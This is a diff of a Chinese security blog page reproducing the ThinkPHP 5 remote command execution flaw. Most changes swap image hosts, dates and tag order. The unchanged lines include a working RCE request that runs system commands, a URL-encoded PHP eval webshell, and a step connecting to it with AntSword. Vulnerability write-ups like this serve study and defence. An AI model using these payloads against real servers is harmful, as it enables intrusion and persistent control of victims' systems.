@@ -15,16 +15,16 @@
 <meta property="og:site_name" content="Laohuan&#39;s Blog">
 <meta property="og:description" content="背景ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-13_17-32-26.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-13_17-35-46.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-13_20-50-06.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-13_20-54-13.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2020-06-13_17-32-26.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2020-06-13_17-35-46.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2020-06-13_20-50-06.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2020-06-13_20-54-13.png">
 <meta property="article:published_time" content="2020-06-13T12:59:28.000Z">
-<meta property="article:modified_time" content="2021-04-19T03:46:52.872Z">
+<meta property="article:modified_time" content="2025-01-06T09:35:35.663Z">
 <meta property="article:author" content="Laohuan">
 <meta property="article:tag" content="ThinkPHP">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://cdn.laohuan.art/2020-06-13_17-32-26.png">
+<meta name="twitter:image" content="http://qn.laohuan.xin/2020-06-13_17-32-26.png">
   
     <link rel="alternative" href="/atom.xml" title="Laohuan&#39;s Blog" type="application/atom+xml">
   
@@ -42,7 +42,7 @@
 
   
 
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body>
   <div id="container" q-class="show:isCtnShow">
@@ -275,12 +275,12 @@
 
 
 
-<p><img src="http://cdn.laohuan.art/2020-06-13_17-32-26.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2020-06-13_17-32-26.png" alt></p>
 <h5><span id="远程命令执行">远程命令执行</span></h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:端口/index.php?s=index/think\app/invokefunction&amp;function=call*_user_*func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="http://cdn.laohuan.art/2020-06-13_17-35-46.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2020-06-13_17-35-46.png" alt></p>
 <h5><span id="写shell">写shell</span></h5><p>1.先将一句话马进行url编码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3c%3fphp+eval(%24_POST%5b123%5d)+%3f%3e</span><br></pre></td></tr></table></figure>
 
@@ -289,11 +289,11 @@
 
 
 
-<p><img src="http://cdn.laohuan.art/2020-06-13_20-50-06.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2020-06-13_20-50-06.png" alt></p>
 <p>3.蚁剑连接</p>
 <p><code>http://IP:端口/shell.php</code></p>
-<p><img src="http://cdn.laohuan.art/2020-06-13_20-54-13.png" alt></p>
-<h4><span id="参考链接">参考链接</span></h4><p><a href="https://www.cnblogs.com/bmjoker/p/10110868.html/" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/10110868.html/</a></p>
+<p><img src="http://qn.laohuan.xin/2020-06-13_20-54-13.png" alt></p>
+<h4><span id="参考链接">参考链接</span></h4><p><a href="http://www.cnblogs.com/bmjoker/p/10110868.html/" target="_blank" rel="noopener">http://www.cnblogs.com/bmjoker/p/10110868.html/</a></p>
 
       
 
@@ -495,7 +495,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2023 Laohuan
+    		&copy; 2025 Laohuan
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -615,6 +615,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CGI</a>
               </li>
              
@@ -623,7 +627,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">考试</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -631,7 +643,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
+                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -643,7 +655,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
+                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -651,7 +663,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -659,7 +671,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">Weblogic</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -675,6 +695,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">zabbix</a>
               </li>
              
@@ -683,39 +707,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">考试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">加解密</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
               </li>
             
             <div class="clearfix"></div>
